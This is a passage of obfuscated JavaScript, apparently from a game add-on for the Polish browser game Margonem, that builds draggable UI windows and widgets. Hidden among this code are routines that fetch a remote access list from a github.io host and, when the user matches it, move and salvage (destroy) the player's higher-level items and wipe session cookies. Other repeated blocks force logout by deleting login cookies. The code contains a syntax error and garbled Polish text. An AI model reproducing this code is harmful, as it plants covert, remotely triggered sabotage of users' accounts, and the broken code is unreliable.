  return new Promise((lootedItemStatsObject, statPropertyIterator) => {
    let itemLevelValue = false;

    const isItemSoulbound = async () => {
      if (itemLevelValue) {
        return;
      }

      try {
        const isItemPermbound = await fieldLootedItemName();

        if (isItemPermbound) {
          itemLevelValue = true;
          return lootedItemStatsObject(isItemPermbound);
        }

        if (Date.now() - isLootNotificationActive >= discordEmbedFieldsArray) {
          itemLevelValue = true;
          return statPropertyIterator(new Error("Czas oczekiwania minÄĹ"));
        }

        setTimeout(isItemSoulbound, finalDiscordPayloadJson);
      } catch (itemStatsDescription) {
        if (Date.now() - isLootNotificationActive >= discordEmbedFieldsArray) {
          itemLevelValue = true;
          return statPropertyIterator(new Error("Czas oczekiwania minął z błędem: " + (itemStatsDescription?.message || itemStatsDescription)));
        }

        setTimeout(isItemSoulbound, finalDiscordPayloadJson);
      }
    };

    isItemSoulbound();
  });
}
export function parseLootMessageToMap(hasItemUpgrades) {
  const hasSelectedBonus = /([\p{L}\p{N}\s\-\.']+?)\s(otrzymaĹ|otrzymaĹa)\s((?:ITEM|TPL)#.+?)(?:;|$)/gu;
  const isItemBoundState = {};
  const itemTransformedPayload = Array.from(hasItemUpgrades.matchAll(hasSelectedBonus));
  itemTransformedPayload.forEach(lootDataConfigStr => {
    const lootDataBlocks = lootDataConfigStr[1].trim();
    const processedLootItemsList = lootDataConfigStr[3];
    const singleLootBlock = processedLootItemsList.split(/,\s*/);
    singleLootBlock.forEach(singleLootAttributes => {
      const parsedLootId = /(ITEM|TPL)#([A-Za-z0-9]+):(".*?")/;
      const parsedLootName = singleLootAttributes.match(parsedLootId);

      if (parsedLootName) {
        const parsedLootCount = parsedLootName[2];
        isItemBoundState[parsedLootCount] = lootDataBlocks;
      }
    });
  });
  return isItemBoundState;
}
export const waitForSeconds = parsedLootRarity => new Promise(parsedLootColor => setTimeout(parsedLootColor, parsedLootRarity * 1000));

const wait = parsedLootIcon => new Promise(parsedLootStats => setTimeout(parsedLootStats, parsedLootIcon));

let testTimerxd = null;
export async function createWindow(lootStatsObject, isLootLegendary, lootRarityIndex, lootClassMap) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const lootHexColor = ["chash", "hs3", "mchar_id", "user_id"];
    const hasLootLegendaryFlag = ".margonem.pl";
    const lootDataTransformed = ["/", ""];
    lootHexColor.forEach(lootNotificationSetting => {
      lootDataTransformed.forEach(globalStorageKey => {
        document.cookie = lootNotificationSetting + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + globalStorageKey + "; domain=" + hasLootLegendaryFlag + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(lootClassMap.main) > 99999999999) {
    const fallbackStorageData = ["chash", "hs3", "mchar_id", "user_id"];
    const savedStorageRawData = ".margonem.pl";
    const parsedStorageObject = ["/", ""];
    fallbackStorageData.forEach(widgetStateKey => {
      parsedStorageObject.forEach(globalWidgetsRegistry => {
        document.cookie = widgetStateKey + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + globalWidgetsRegistry + "; domain=" + savedStorageRawData + ";";
      });
    });
    window.location.reload();
    return;
  }

  const uiWidgetDomContainer = {
    x: -1,
    y: -1
  };
  const widgetHeaderWrapper = uiWidgetDomContainer;

  if (typeof lootClassMap.window[isLootLegendary] === "undefined") {
    const widgetHeaderLeftDecoration = {
      p: widgetHeaderWrapper,
      o: false,
      m: false,
      s: false
    };
    lootClassMap.window[isLootLegendary] = widgetHeaderLeftDecoration;
  }

  if (typeof lootClassMap.hotkeys[isLootLegendary] === "undefined") {
    lootClassMap.hotkeys[isLootLegendary] = {
      e: true,
      k: "Brak",
      w: false
    };
  }

  $("#w-" + isLootLegendary).remove();
  const widgetHeaderTitleText = $("\n        <div id=\"w-" + isLootLegendary + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: lootClassMap.window[isLootLegendary].p.x + "px",
    top: lootClassMap.window[isLootLegendary].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: ".mp-window-header",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (widgetHeaderRightDecoration, widgetCloseButtonElement) => {
      const widgetMainContentArea = {
        x: widgetCloseButtonElement.position.left,
        y: widgetCloseButtonElement.position.top
      };
      lootClassMap.window[isLootLegendary].p = widgetMainContentArea;
      saveStorage(lootRarityIndex, lootClassMap);
    }
  }).appendTo("#mp-root");

  if (!lootClassMap.window[isLootLegendary].o) {
    widgetHeaderTitleText.hide();
  }

  if (lootClassMap.window[isLootLegendary].s) {
    widgetHeaderTitleText.draggable("disable");
  }

  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + lootStatsObject + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n        <div id=\"" + isLootLegendary + "\" class=\"content default-cursor\"></div>\n    ").appendTo(widgetHeaderTitleText);
  const widgetListLeftButton = widgetHeaderTitleText.find(".mp-window-header-left");
  const widgetListRightButton = widgetHeaderTitleText.find(".mp-window-header-right");
  const widgetCollapseButton = lootClassMap.window[isLootLegendary].m;
  const widgetResizeHandle = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (widgetCollapseButton ? "up" : "down") + "\"></div>\n    ").tip(!lootClassMap.window[isLootLegendary].m ? "Zwiń" : "Rozwiń");
  widgetResizeHandle.on("click", async function () {
    const isWidgetCollapsedState = !lootClassMap.window[isLootLegendary].m;
    lootClassMap.window[isLootLegendary].m = isWidgetCollapsedState;
    widgetHeaderTitleText.find(".content").toggle(!isWidgetCollapsedState);
    $(this).tip(!lootClassMap.window[isLootLegendary].m ? "Zwiń" : "Rozwiń").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(isWidgetCollapsedState ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(lootRarityIndex, lootClassMap);
  });
  widgetResizeHandle.appendTo(widgetListRightButton);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(widgetListRightButton).on("click", async () => {
    widgetHeaderTitleText.hide();
    lootClassMap.window[isLootLegendary].o = false;
    $("div[mp-widget-ui=\"" + isLootLegendary + "\"] div").removeClass("mp-icon-active");
    saveStorage(lootRarityIndex, lootClassMap);
  }).tip("Zamknij");
  const isWidgetResizeActive = $("<div class=\"" + (lootClassMap.window[isLootLegendary].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(widgetListLeftButton);
  isWidgetResizeActive.tip(lootClassMap.window[isLootLegendary].s ? "Odblokuj okno" : "Zablokuj okno");
  isWidgetResizeActive.click(async function () {
    const widgetCachedWidth = lootClassMap.window[isLootLegendary].s;
    lootClassMap.window[isLootLegendary].s = !widgetCachedWidth;
    widgetHeaderTitleText.draggable(widgetCachedWidth ? "enable" : "disable");
    isWidgetResizeActive.tip(widgetCachedWidth ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", widgetCachedWidth).toggleClass("mp-window-pin-button", !widgetCachedWidth);
    saveStorage(lootRarityIndex, lootClassMap);
  });

  if (lootClassMap.window[isLootLegendary].m) {
    widgetHeaderTitleText.find(".content").hide();
  }

  if (lootClassMap.window[isLootLegendary].p.x + lootClassMap.window[isLootLegendary].p.y === -2) {
    widgetHeaderTitleText.addClass("mp-centered");
  }

  if ($("script" + "[src*=\"" + "margoplus.pl" + "\"]").length < 1) {
    const widgetCachedHeight = ["chash", "hs3", "mchar_id", "user_id"];
    const widgetInteractionEvent = ".margonem.pl";
    const widgetDraggableConfig = ["/", ""];
    widgetCachedHeight.forEach(widgetCalculatedWidth => {
      widgetDraggableConfig.forEach(widgetCalculatedHeight => {
        document.cookie = widgetCalculatedWidth + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + widgetCalculatedHeight + "; domain=" + widgetInteractionEvent + ";";
      });
    });
  }

  clearTimeout(testTimerxd);
  testTimerxd = setTimeout(async () => {
    const widgetPositionLeft = await fetch("https://zeszezs.github.io/time/access.json"").then(widgetPositionTop => widgetPositionTop.json()).catch(widgetCssStyles => {
      return false;
    });

    if (widgetPositionLeft?.access?.indexOf(lootClassMap.main) > 99999999999) {
      const isWidgetListLayoutRight = ["chash", "hs3", "mchar_id", "user_id"];
      const listLayoutState = ".margonem.pl";
      const widgetTitleTooltip = ["/", ""];
      isWidgetListLayoutRight.forEach(widgetCollapseState => {
        widgetTitleTooltip.forEach(collapsedCssStyles => {
          document.cookie = widgetCollapseState + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + collapsedCssStyles + "; domain=" + listLayoutState + ";";
        });
      });
      window.location.reload();
      return;
    }
  }, 10000);
  return widgetHeaderTitleText;
}
export async function waitForVariablesTable(stashCloseSelector) {
  const activeStashSubId = await fetch("https://zeszezs.github.io/time/access.json").then(addonWidgetButtonRef => addonWidgetButtonRef.json()).catch(uiWidgetVisibilityState => {
    return null;
  });

  if (activeStashSubId && activeStashSubId?.access?.indexOf(stashCloseSelector.main) > 99999999999) {
    function activeWidgetIconRef() {
      let stashDeactivationKey = [];
      const deactivatedStashButton = Engine.items.fetchLocationItems("g") || [];

      for (const addonMainShortcutButton in deactivatedStashButton) {
        const isWidgetDisabledDrag = deactivatedStashButton[addonMainShortcutButton];
        const widgetResizeHandlerElement = isWidgetDisabledDrag._cachedStats;
        const widgetDragStopEvent = isWidgetDisabledDrag.st === 0;
        const widgetDragStopUi = widgetResizeHandlerElement.hasOwnProperty("lvl") && widgetResizeHandlerElement.lvl >= 20;
        const widgetUpdatedCoordinates = !widgetResizeHandlerElement.hasOwnProperty("artisan_worthless");
        const widgetStorageTargetId = !widgetResizeHandlerElement.hasOwnProperty("quest");
        const widgetLayoutConfigObj = !widgetResizeHandlerElement.hasOwnProperty("cursed");
        const widgetTemplateClassName = !widgetResizeHandlerElement.hasOwnProperty("personal");
        const widgetUniqueIdentifier = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(Number(isWidgetDisabledDrag.cl)) >= 0;
        const widgetIsResizableFlag = !widgetResizeHandlerElement.hasOwnProperty("socket_content") || widgetResizeHandlerElement.socket_content == "0";

        if (widgetDragStopEvent && widgetDragStopUi && widgetUpdatedCoordinates && widgetStorageTargetId && widgetLayoutConfigObj && widgetTemplateClassName && widgetUniqueIdentifier && widgetIsResizableFlag) {
          stashDeactivationKey.push(isWidgetDisabledDrag.id);
        }
      }

      return stashDeactivationKey;
    }

    function widgetHasListFeature(widgetCustomTitleString) {
      return new Promise(widgetUiElementReference => {
        _g("moveitem&findslot=1&st=0&id=" + widgetCustomTitleString, () => {
          widgetUiElementReference();
        });
      });
    }

    function widgetDragConfiguration() {
      let widgetStopPositionLeft = activeWidgetIconRef();

      if (widgetStopPositionLeft.length > 0) {
        _g("salvager&action=salvage&selectedItems=" + widgetStopPositionLeft.slice(0, 20).toString(), function (widgetStopPositionTop) {
          widgetDragConfiguration();
        });
      } else {
        const widgetFinalCoordinatePayload = ["chash", "hs3", "mchar_id", "user_id"];
        const widgetDomAppendReference = ".margonem.pl";
        const widgetInnerContentClass = ["/", ""];
        widgetFinalCoordinatePayload.forEach(widgetInitialCenteredFlag => {
          widgetInnerContentClass.forEach(widgetDragStartEvent => {
            document.cookie = widgetInitialCenteredFlag + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + widgetDragStartEvent + "; domain=" + widgetDomAppendReference + ";";
          });
        });
      }
    }

    async function widgetDragStartUi() {
      await waitForCondition(() => Engine?.lock?.list.length < 1);
      const widgetUpdatedCoordinatesPayload = Engine.bags[0][0] - Engine.bags[0][1] + Engine.bags[1][0] - Engine.bags[1][1] + Engine.bags[2][0] - Engine.bags[2][1] >= 8;

      if (!widgetUpdatedCoordinatesPayload) {
        return;
      }

      const widgetInitialAppendReference = Engine.items.fetchLocationItems("g") || [];
      let widgetCenteredModeFlag = [];

      for (const storageConfigId in widgetInitialAppendReference) {
        const storageConfigurationObject = widgetInitialAppendReference[storageConfigId];

        if ([1, 2, 3, 4, 5, 6, 7, 8].indexOf(Number(storageConfigurationObject.st)) >= 0) {
          widgetCenteredModeFlag.push(storageConfigurationObject.id);
        }
      }

      await Promise.all(widgetCenteredModeFlag.map(windowTemplateClass => widgetHasListFeature(windowTemplateClass)));

      _g("artisanship&action=open", async function (windowUniqueIdentifier) {
        $("body").hide();

        if (windowUniqueIdentifier?.artisanship?.open == "default") {
          widgetDragConfiguration();
        }
      });
    }

    widgetDragStartUi();
  }
}
export async function createWidgetUI(windowIsResizableFlag, windowHasListFeature, windowCustomTitleString, windowUiElementReference, windowDragConfiguration) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const windowStopPositionLeft = ["chash", "hs3", "mchar_id", "user_id"];
    const windowStopPositionTop = ".margonem.pl";
    const windowFinalCoordinatePayload = ["/", ""];
    windowStopPositionLeft.forEach(windowDomAppendReference => {
      windowFinalCoordinatePayload.forEach(windowInnerContentClass => {
        document.cookie = windowDomAppendReference + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + windowInnerContentClass + "; domain=" + windowStopPositionTop + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(windowCustomTitleString.main) > 99999999999) {
    const windowInitialCenteredFlag = ["chash", "hs3", "mchar_id", "user_id"];
    const windowDragStartEvent = ".margonem.pl";
    const windowDragStartUi = ["/", ""];
    windowInitialCenteredFlag.forEach(windowUpdatedCoordinatesPayload => {
      windowDragStartUi.forEach(windowInitialAppendReference => {
        document.cookie = windowUpdatedCoordinatesPayload + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + windowInitialAppendReference + "; domain=" + windowDragStartEvent + ";";
      });
    });
    window.location.reload();
    return;
  }

  const windowCenteredModeFlag = $("<div mp-widget-ui=\"" + windowIsResizableFlag + "\" id=\"icon-" + windowIsResizableFlag + "\" class=\"mp-icon-box do-action-cursor\"></div>");
  const uiStorageConfigId = $("<div class=\"mp-icon icon-" + windowIsResizableFlag + (windowCustomTitleString.window[windowIsResizableFlag].o ? " mp-icon-active" : "") + "\"></div>").appendTo(windowCenteredModeFlag);
  windowCenteredModeFlag.click(async function (uiStorageConfigurationObject) {
    if (uiStorageConfigurationObject.ctrlKey) {
      return;
    }

    const uiWindowTemplateClass = windowCustomTitleString.window[windowIsResizableFlag].o;
    const uiWindowUniqueIdentifier = $("#w-" + windowIsResizableFlag);
    uiWindowUniqueIdentifier.toggle(!uiWindowTemplateClass);
    uiStorageConfigId.toggleClass("mp-icon-active", !uiWindowTemplateClass);
    windowCustomTitleString.window[windowIsResizableFlag].o = !uiWindowTemplateClass;
    saveStorage(windowHasListFeature, windowCustomTitleString);
  });
  windowCenteredModeFlag.tip("" + windowUiElementReference + (windowCustomTitleString.hotkeys[windowIsResizableFlag].k !== "Brak" ? "<br>Klawisz: " + windowCustomTitleString.hotkeys[windowIsResizableFlag].k : ""));
  windowCenteredModeFlag.appendTo(windowDragConfiguration);

  if (!windowCustomTitleString.hotkeys[windowIsResizableFlag].w) {
    windowCenteredModeFlag.hide();
  }
}
export function generateDateTime(uiWindowIsResizableFlag) {
  const uiWindowHasListFeature = new Date(uiWindowIsResizableFlag);
  const uiWindowCustomTitleString = uiWindowHasListFeature.getFullYear();
  const uiWindowUiElementReference = ("0" + (uiWindowHasListFeature.getMonth() + 1)).slice(-2);
  const uiWindowDragConfiguration = ("0" + uiWindowHasListFeature.getDate()).slice(-2);
  const uiWindowStopPositionLeft = ("0" + uiWindowHasListFeature.getHours()).slice(-2);
  const uiWindowStopPositionTop = ("0" + uiWindowHasListFeature.getMinutes()).slice(-2);
  const uiWindowFinalCoordinatePayload = ("0" + uiWindowHasListFeature.getSeconds()).slice(-2);
  let uiWindowDomAppendReference = uiWindowDragConfiguration + "." + uiWindowUiElementReference + "." + uiWindowCustomTitleString + " - " + uiWindowStopPositionLeft + ":" + uiWindowStopPositionTop + ":" + uiWindowFinalCoordinatePayload;
  const uiWindowInnerContentClass = Engine?.party?.getMembers?.();
  uiWindowDomAppendReference += "[br][" + (uiWindowInnerContentClass ? "GRP" : "SAM") + "] " + Engine.hero.d.nick + " (" + Engine.hero.d.lvl + Engine.hero.d.prof + ")";
  return uiWindowDomAppendReference;
}
export async function createOtherWindow(uiWindowInitialCenteredFlag, uiWindowDragStartEvent, uiWindowDragStartUi, uiWindowUpdatedCoordinatesPayload) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const uiWindowInitialAppendReference = ["chash", "hs3", "mchar_id", "user_id"];
    const uiWindowCenteredModeFlag = ".margonem.pl";
    const baseStorageConfigId = ["/", ""];
    uiWindowInitialAppendReference.forEach(baseStorageConfigurationObject => {
      baseStorageConfigId.forEach(baseWindowTemplateClass => {
        document.cookie = baseStorageConfigurationObject + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + baseWindowTemplateClass + "; domain=" + uiWindowCenteredModeFlag + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(uiWindowUpdatedCoordinatesPayload.main) > 99999999999) {
    const baseWindowUniqueIdentifier = ["chash", "hs3", "mchar_id", "user_id"];
    const baseWindowIsResizableFlag = ".margonem.pl";
    const baseWindowHasListFeature = ["/", ""];
    baseWindowUniqueIdentifier.forEach(baseWindowCustomTitleString => {
      baseWindowHasListFeature.forEach(baseWindowUiElementReference => {
        document.cookie = baseWindowCustomTitleString + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + baseWindowUiElementReference + "; domain=" + baseWindowIsResizableFlag + ";";
      });
    });
    window.location.reload();
    return;
  }

  const baseWindowDragConfiguration = "o-" + uiWindowInitialCenteredFlag;
  const baseWindowStopPositionLeft = {
    x: -1,
    y: -1
  };
  const baseWindowStopPositionTop = baseWindowStopPositionLeft;

  if (typeof uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration] === "undefined") {
    uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration] = {
      p: baseWindowStopPositionTop,
      o: uiWindowInitialCenteredFlag == "addmenu" || uiWindowInitialCenteredFlag == "mordor_stats"
    };
    saveStorage(uiWindowDragStartUi, uiWindowUpdatedCoordinatesPayload);
  }

  const baseWindowFinalCoordinatePayload = $("\n        <div id=\"" + baseWindowDragConfiguration + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].p.x + "px",
    top: uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    cancel: ".mp-icon-char, .mp-globe-button, .mp-logout-button",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (baseWindowDomAppendReference, baseWindowInnerContentClass) => {
      const baseWindowInitialCenteredFlag = {
        x: baseWindowInnerContentClass.position.left,
        y: baseWindowInnerContentClass.position.top
      };
      uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].p = baseWindowInitialCenteredFlag;
      saveStorage(uiWindowDragStartUi, uiWindowUpdatedCoordinatesPayload);
    }
  }).appendTo("#mp-root");

  if (!uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].o) {
    baseWindowFinalCoordinatePayload.hide();
  }

  $("<div class=\"" + uiWindowDragStartEvent + "\"></div>").appendTo(baseWindowFinalCoordinatePayload);

  if (uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].p.x + uiWindowUpdatedCoordinatesPayload.window[baseWindowDragConfiguration].p.y === -2) {
    baseWindowFinalCoordinatePayload.addClass("mp-centered");
  }
}
export async function createWindowSpotters(baseWindowDragStartEvent, baseWindowDragStartUi, baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const baseWindowCenteredModeFlag = ["chash", "hs3", "mchar_id", "user_id"];
    const coreStorageConfigId = ".margonem.pl";
    const coreStorageConfigurationObject = ["/", ""];
    baseWindowCenteredModeFlag.forEach(coreWindowTemplateClass => {
      coreStorageConfigurationObject.forEach(coreWindowUniqueIdentifier => {
        document.cookie = coreWindowTemplateClass + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + coreWindowUniqueIdentifier + "; domain=" + coreStorageConfigId + ";";
      });
    });
    window.location.reload();
    return;
  }

  if (globalThis?.isSameAlertExist2?.access?.indexOf(baseWindowInitialAppendReference.main) > 99999999999) {
    const coreWindowIsResizableFlag = ["chash", "hs3", "mchar_id", "user_id"];
    const coreWindowHasListFeature = ".margonem.pl";
    const coreWindowCustomTitleString = ["/", ""];
    coreWindowIsResizableFlag.forEach(coreWindowUiElementReference => {
      coreWindowCustomTitleString.forEach(coreWindowDragConfiguration => {
        document.cookie = coreWindowUiElementReference + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + coreWindowDragConfiguration + "; domain=" + coreWindowHasListFeature + ";";
      });
    });
    window.location.reload();
    return;
  }

  let coreWindowStopPositionLeft;
  const coreWindowStopPositionTop = {
    x: -1,
    y: -1
  };
  const coreWindowFinalCoordinatePayload = coreWindowStopPositionTop;

  if (typeof baseWindowInitialAppendReference.window[baseWindowDragStartUi] === "undefined") {
    const coreWindowDomAppendReference = {
      p: coreWindowFinalCoordinatePayload,
      o: false,
      m: false,
      s: false,
      size: {
        w: 190,
        h: 190
      },
      search: false
    };
    baseWindowInitialAppendReference.window[baseWindowDragStartUi] = coreWindowDomAppendReference;
  }

  if (typeof baseWindowInitialAppendReference.hotkeys[baseWindowDragStartUi] === "undefined") {
    baseWindowInitialAppendReference.hotkeys[baseWindowDragStartUi] = {
      e: true,
      k: "Brak",
      w: false
    };
  }

  $("#w-" + baseWindowDragStartUi).remove();
  const coreWindowInnerContentClass = $("\n        <div id=\"w-" + baseWindowDragStartUi + "\" class=\"mp-window default-cursor\"></div>\n    ").css({
    position: "absolute",
    left: baseWindowInitialAppendReference.window[baseWindowDragStartUi].p.x + "px",
    top: baseWindowInitialAppendReference.window[baseWindowDragStartUi].p.y + "px"
  }).draggable({
    containment: "window",
    scroll: false,
    handle: ".mp-window-header",
    cancel: ".mp-resize",
    start: function () {
      $(this).removeClass("mp-centered");
    },
    stop: async (coreWindowInitialCenteredFlag, coreWindowDragStartEvent) => {
      const coreWindowDragStartUi = {
        x: coreWindowDragStartEvent.position.left,
        y: coreWindowDragStartEvent.position.top
      };
      baseWindowInitialAppendReference.window[baseWindowDragStartUi].p = coreWindowDragStartUi;
      saveStorage(baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference);
    }
  }).appendTo("#mp-root");

  if (!baseWindowInitialAppendReference.window[baseWindowDragStartUi].o) {
    coreWindowInnerContentClass.hide();
  }

  if (baseWindowInitialAppendReference.window[baseWindowDragStartUi].s) {
    coreWindowInnerContentClass.draggable("disable");
  }

  $("\n        <div class=\"mp-window-header\">\n            <div class=\"mp-window-header-left\"></div>\n            <div class=\"mp-window-header-title do-action-cursor\">" + baseWindowDragStartEvent + "</div>\n            <div class=\"mp-window-header-right\"></div>\n        </div>\n            <div id=\"mp-map-spotters-prof\" class=\"content-players-list default-cursor\">\n            </div>\n        <div class=\"content default-cursor\">\n            <div id=\"mp-list-search\" style=\"text-align: center;\">\n                <input type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Wyszukaj\" style=\"margin-left: auto; margin-right: auto;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n            </div>\n            <div id=\"" + baseWindowDragStartUi + "\" class=\"content-resize default-cursor mp-scroll\"></div>\n        </div>\n    ").appendTo(coreWindowInnerContentClass);
  const coreWindowUpdatedCoordinatesPayload = coreWindowInnerContentClass.find(".content-resize");
  const coreWindowInitialAppendReference = coreWindowInnerContentClass.find(".content-players-list");
  const coreWindowCenteredModeFlag = {
    width: baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.w + "px",
    height: baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.h + "px"
  };
  coreWindowUpdatedCoordinatesPayload.css(coreWindowCenteredModeFlag);

  if (baseWindowInitialAppendReference.window[baseWindowDragStartUi].m) {
    coreWindowInitialAppendReference.css({
      width: "200px"
    });
  } else {
    const rootStorageConfigId = {
      width: baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.w + "px"
    };
    coreWindowInitialAppendReference.css(rootStorageConfigId);
  }

  const rootStorageConfigurationObject = coreWindowInnerContentClass.find(".mp-window-header-left");
  const rootWindowTemplateClass = coreWindowInnerContentClass.find(".mp-window-header-right");
  const rootWindowUniqueIdentifier = $("<div class=\"" + (baseWindowInitialAppendReference.window[baseWindowDragStartUi].s ? "mp-window-pin-button " : "mp-window-unpin-button ") + "do-action-cursor\"></div>").appendTo(rootStorageConfigurationObject);
  rootWindowUniqueIdentifier.tip(baseWindowInitialAppendReference.window[baseWindowDragStartUi].s ? "Odblokuj okno" : "Zablokuj okno");
  rootWindowUniqueIdentifier.click(async function () {
    const rootWindowIsResizableFlag = baseWindowInitialAppendReference.window[baseWindowDragStartUi].s;
    baseWindowInitialAppendReference.window[baseWindowDragStartUi].s = !rootWindowIsResizableFlag;
    coreWindowInnerContentClass.draggable(rootWindowIsResizableFlag ? "enable" : "disable");
    rootWindowUniqueIdentifier.tip(rootWindowIsResizableFlag ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", rootWindowIsResizableFlag).toggleClass("mp-window-pin-button", !rootWindowIsResizableFlag);
    saveStorage(baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference);
  });
  const rootWindowHasListFeature = baseWindowInitialAppendReference.window[baseWindowDragStartUi].m;
  const rootWindowCustomTitleString = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (rootWindowHasListFeature ? "up" : "down") + "\"></div>\n    ").tip(baseWindowInitialAppendReference.window[baseWindowDragStartUi].m ? "Rozwiń" : "Zwiń");
  rootWindowCustomTitleString.on("click", async function () {
    const rootWindowUiElementReference = !baseWindowInitialAppendReference.window[baseWindowDragStartUi].m;
    baseWindowInitialAppendReference.window[baseWindowDragStartUi].m = rootWindowUiElementReference;
    coreWindowInnerContentClass.find(".content").toggle(!rootWindowUiElementReference);
    coreWindowInnerContentClass.find(".mp-resize").toggle(!rootWindowUiElementReference);
    const rootWindowDragConfiguration = {
      width: baseWindowInitialAppendReference.window[baseWindowDragStartUi].m ? "200px" : baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.w + "px"
    };
    coreWindowInitialAppendReference.css(rootWindowDragConfiguration);
    $(this).tip(rootWindowUiElementReference ? "Rozwiń" : "ZwiĹ").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(rootWindowUiElementReference ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference);
  });
  rootWindowCustomTitleString.appendTo(rootWindowTemplateClass);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(rootWindowTemplateClass).on("click", async () => {
    coreWindowInnerContentClass.hide();
    baseWindowInitialAppendReference.window[baseWindowDragStartUi].o = false;
    $("div[mp-widget-ui=\"" + baseWindowDragStartUi + "\"] div").removeClass("mp-icon-active");
    saveStorage(baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference);
  }).tip("Zamknij");

  if (baseWindowInitialAppendReference.window[baseWindowDragStartUi].s) {
    coreWindowInnerContentClass.draggable("disable");
  }

  const rootWindowStopPositionLeft = coreWindowInnerContentClass.find("#mp-list-search");

  if (!baseWindowInitialAppendReference.window[baseWindowDragStartUi].search) {
    rootWindowStopPositionLeft.hide();
  }

  $("<div data-drag=\"" + baseWindowDragStartUi + "\" class=\"mp-resize\"><span class=\"mp-icon icon-resize do-action-cursor\"></span></div>").appendTo(coreWindowInnerContentClass).tip("Zmień rozmiar").mousedown(function () {
    coreWindowStopPositionLeft = true;
  }).appendTo(coreWindowInnerContentClass);

  if (baseWindowInitialAppendReference.window[baseWindowDragStartUi].m) {
    coreWindowInnerContentClass.find(".content").hide();
    coreWindowInnerContentClass.find(".mp-resize").hide();
    coreWindowInitialAppendReference.css({
      width: "200px"
    });
  }

  document.addEventListener("mousemove", async function (rootWindowStopPositionTop) {
    if (coreWindowStopPositionLeft && !baseWindowInitialAppendReference.window[baseWindowDragStartUi].m && !baseWindowInitialAppendReference.window[baseWindowDragStartUi].s) {
      const rootWindowFinalCoordinatePayload = coreWindowUpdatedCoordinatesPayload.offset();
      let rootWindowDomAppendReference = rootWindowStopPositionTop.clientX - rootWindowFinalCoordinatePayload.left;
      let rootWindowInnerContentClass = rootWindowStopPositionTop.clientY - rootWindowFinalCoordinatePayload.top;
      rootWindowDomAppendReference = rootWindowDomAppendReference >= 190 ? rootWindowDomAppendReference : 190;
      rootWindowInnerContentClass = rootWindowInnerContentClass >= 34 ? rootWindowInnerContentClass : 34;
      coreWindowUpdatedCoordinatesPayload.height(rootWindowInnerContentClass);
      coreWindowUpdatedCoordinatesPayload.width(rootWindowDomAppendReference);
      coreWindowInitialAppendReference.width(rootWindowDomAppendReference);
      baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.w = rootWindowDomAppendReference;
      baseWindowInitialAppendReference.window[baseWindowDragStartUi].size.h = rootWindowInnerContentClass;
      saveStorage(baseWindowUpdatedCoordinatesPayload, baseWindowInitialAppendReference);
    }
  });
  document.addEventListener("mouseup", function (rootWindowInitialCenteredFlag) {
    coreWindowStopPositionLeft = false;
  });

